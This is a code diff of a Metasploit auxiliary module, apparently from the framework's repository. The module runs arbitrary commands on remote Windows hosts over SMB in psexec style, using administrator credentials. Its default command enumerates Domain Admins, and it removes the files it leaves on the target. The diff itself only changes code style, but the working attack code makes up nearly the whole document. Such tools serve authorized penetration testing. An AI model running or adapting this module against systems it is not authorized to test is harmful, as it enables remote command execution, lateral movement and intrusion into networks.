@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -6,7 +7,6 @@
 require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::SMB::Client::Psexec
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::Scanner
@@ -18,41 +18,40 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'           => 'Microsoft Windows Authenticated Administration Utility',
-      'Description'    => %q{
-          This module uses a valid administrator username and password to execute an
-        arbitrary command on one or more hosts, using a similar technique than the "psexec"
-        utility provided by SysInternals. Daisy chaining commands with '&' does not work
-        and users shouldn't try it. This module is useful because it doesn't need to upload
-        any binaries to the target machine.
-      },
+                      'Name'           => 'Microsoft Windows Authenticated Administration Utility',
+                      'Description'    => %q(
+                          This module uses a valid administrator username and password to execute an
+                        arbitrary command on one or more hosts, using a similar technique than the "psexec"
+                        utility provided by SysInternals. Daisy chaining commands with '&' does not work
+                        and users shouldn't try it. This module is useful because it doesn't need to upload
+                        any binaries to the target machine.
+                      ),
 
-      'Author'         => [
-        'Royce Davis @R3dy__ <rdavis[at]accuvant.com>',
-      ],
+                      'Author' => [
+                        'Royce Davis @R3dy__ <rdavis[at]accuvant.com>'
+                      ],
 
-      'License'        => MSF_LICENSE,
-      'References'     => [
-        [ 'CVE', '1999-0504'], # Administrator with no password (since this is the default)
-        [ 'OSVDB', '3106'],
-        [ 'URL', 'http://www.accuvant.com/blog/2012/11/13/owning-computers-without-shell-access' ],
-        [ 'URL', 'http://sourceforge.net/projects/smbexec/' ],
-        [ 'URL', 'http://technet.microsoft.com/en-us/sysinternals/bb897553.aspx' ]
-      ]
-    ))
+                      'License'        => MSF_LICENSE,
+                      'References'     => [
+                        [ 'CVE', '1999-0504'], # Administrator with no password (since this is the default)
+                        [ 'OSVDB', '3106'],
+                        [ 'URL', 'http://www.accuvant.com/blog/2012/11/13/owning-computers-without-shell-access' ],
+                        [ 'URL', 'http://sourceforge.net/projects/smbexec/' ],
+                        [ 'URL', 'http://technet.microsoft.com/en-us/sysinternals/bb897553.aspx' ]
+                      ]))
 
     register_options([
-      OptString.new('SMBSHARE', [true, 'The name of a writeable share on the server', 'C$']),
-      OptString.new('COMMAND', [true, 'The command you want to execute on the remote host', 'net group "Domain Admins" /domain']),
-      OptString.new('RPORT', [true, 'The Target port', 445]),
-      OptString.new('WINPATH', [true, 'The name of the remote Windows directory', 'WINDOWS']),
-    ], self.class)
+                       OptString.new('SMBSHARE', [true, 'The name of a writeable share on the server', 'C$']),
+                       OptString.new('COMMAND', [true, 'The command you want to execute on the remote host', 'net group "Domain Admins" /domain']),
+                       OptString.new('RPORT', [true, 'The Target port', 445]),
+                       OptString.new('WINPATH', [true, 'The name of the remote Windows directory', 'WINDOWS'])
+                     ], self.class)
 
     register_advanced_options([
-      OptString.new('FILEPREFIX', [false, 'Add a custom prefix to the temporary files','']),
-      OptInt.new('DELAY', [true, 'Wait this many seconds before reading output and cleaning up', 0]),
-      OptInt.new('RETRY', [true, 'Retry this many times to check if the process is complete', 0]),
-    ], self.class)
+                                OptString.new('FILEPREFIX', [false, 'Add a custom prefix to the temporary files', '']),
+                                OptInt.new('DELAY', [true, 'Wait this many seconds before reading output and cleaning up', 0]),
+                                OptInt.new('RETRY', [true, 'Retry this many times to check if the process is complete', 0])
+                              ], self.class)
 
     deregister_options('RHOST')
   end
@@ -78,9 +77,9 @@ class MetasploitModule < Msf::Auxiliary
         for i in 0..(datastore['RETRY'])
           Rex.sleep(datastore['DELAY'])
           # if the output file is still locked then the program is still likely running
-          if (exclusive_access(text))
+          if exclusive_access(text)
             break
-          elsif (i == datastore['RETRY'])
+          elsif i == datastore['RETRY']
             print_error("Command seems to still be executing. Try increasing RETRY and DELAY")
           end
         end
@@ -111,7 +110,7 @@ class MetasploitModule < Msf::Auxiliary
     print_status("Getting the command output...")
     output = smb_read_file(@smbshare, @ip, file)
     if output.nil?
-      print_error("Error getting command output. #{$!.class}. #{$!}.")
+      print_error("Error getting command output. #{$ERROR_INFO.class}. #{$ERROR_INFO}.")
       return
     end
     if output.empty?
@@ -122,16 +121,15 @@ class MetasploitModule < Msf::Auxiliary
     # Report output
     print_good("Command completed successfuly!")
     vprint_status("Output for \"#{datastore['COMMAND']}\":")
-    vprint_line("#{output}")
+    vprint_line(output.to_s)
 
     report_note(
-      :rhost => datastore['RHOSTS'],
-      :rport => datastore['RPORT'],
-      :type => "psexec_command",
-      :name => datastore['COMMAND'],
-      :data => output
+      rhost: datastore['RHOSTS'],
+      rport: datastore['RPORT'],
+      type: "psexec_command",
+      name: datastore['COMMAND'],
+      data: output
     )
-
   end
 
   # check if our process is done using these files
@@ -153,16 +151,15 @@ class MetasploitModule < Msf::Auxiliary
       end
       simple.disconnect("\\\\#{@ip}\\#{@smbshare}")
     end
-    return true
+    true
   end
-
 
   # Removes files created during execution.
   def cleanup_after(*files)
     begin
       simple.connect("\\\\#{@ip}\\#{@smbshare}")
     rescue Rex::Proto::SMB::Exceptions::ErrorCode => accesserror
-      print_error("Unable to connect for cleanup: #{accesserror}. Maybe you'll need to manually remove #{files.join(", ")} from the target.")
+      print_error("Unable to connect for cleanup: #{accesserror}. Maybe you'll need to manually remove #{files.join(', ')} from the target.")
       return
     end
     print_status("Executing cleanup...")
@@ -173,12 +170,11 @@ class MetasploitModule < Msf::Auxiliary
         print_error("Unable to cleanup #{file}. Error: #{cleanuperror}")
       end
     end
-    left = files.collect{ |f| smb_file_exist?(f) }
+    left = files.collect { |f| smb_file_exist?(f) }
     if left.any?
-      print_error("Unable to cleanup. Maybe you'll need to manually remove #{left.join(", ")} from the target.")
+      print_error("Unable to cleanup. Maybe you'll need to manually remove #{left.join(', ')} from the target.")
     else
       print_status("Cleanup was successful")
     end
   end
-
 end
